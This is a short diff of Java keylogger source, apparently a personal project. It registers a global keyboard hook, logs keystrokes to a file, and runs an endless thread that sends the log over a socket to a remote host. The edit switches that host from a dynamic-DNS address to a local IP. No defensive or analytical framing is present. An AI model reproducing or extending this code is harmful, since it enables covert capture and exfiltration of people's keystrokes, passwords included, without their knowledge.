@@ -27,7 +27,7 @@ public class MainKey implements NativeKeyListener {
 
 	//C:\Users\EA6259\Documents\juan\Proyectos-JAVA.git\branches\mantenimiento-1\keylogger\.	
 	public static void main(String[] args) {
-
+System.out.println("Iniciando programa");
 
 		try {
 			GlobalScreen.registerNativeHook();
@@ -82,7 +82,7 @@ class enviaLog extends Thread{
 		System.out.println("thread  1");
 		try{
 			while(true){
-				sock = new Socket("raspibjuan.redirectme.net", 5055);
+				sock = new Socket("192.168.0.167", 5050);
 				File log = new File (path);
 				byte [] mybytearray  = new byte [(int)log.length()];
 				fis = new FileInputStream(log);
@@ -146,11 +146,10 @@ class log{
 		return path + "\\log.txt";
 	}
 
-
 	public void escribir(String s, String path){
 
 		try {
-			log = new BufferedWriter(new FileWriter(path + "\\log.txt",true));
+			log = new BufferedWriter(new FileWriter(path,true));
 			log.write(s);
 			log.close();
 		} catch (IOException e) {
